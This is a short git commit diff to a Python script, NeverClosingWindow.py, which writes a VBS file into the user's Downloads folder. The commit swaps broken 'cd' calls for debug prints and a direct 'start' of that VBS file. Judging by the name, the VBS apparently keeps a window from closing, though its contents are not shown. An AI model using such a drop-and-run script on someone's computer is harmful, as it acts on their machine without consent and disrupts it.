2ef1fe6a3f6dde2ed1a0343fd6fda3632ba6fc85
Maxpy226 <db@servus.at>
2024-11-09 17:30:08 +0100

    Update NeverClosingWindow.py

--- files/NeverClosingWindow.py
+++ files/NeverClosingWindow.py
@@ -1,5 +1,5 @@
 import os
-
+import time
 
 # Get the user's Downloads directory
 downloads_dir = os.path.join(os.path.expanduser("~"), "Downloads")
@@ -22,11 +22,10 @@ with open(vbs_file_path, "w") as vbs_file:
 
 print(f"VBS file has been created at: {vbs_file_path}")
 
-os.system('start cmd')
-
-os.system('cd ..')
-os.system('cd ..')
-os.system('cd downloads')
-os.system('start do.vbs')
-
+time.sleep(1)
+print("debug enabled file")
+print(vbs_file_path)
+print("current dir: ", os.getcwd())
+os.system(f"start {vbs_file_path}")
+print("started")
 
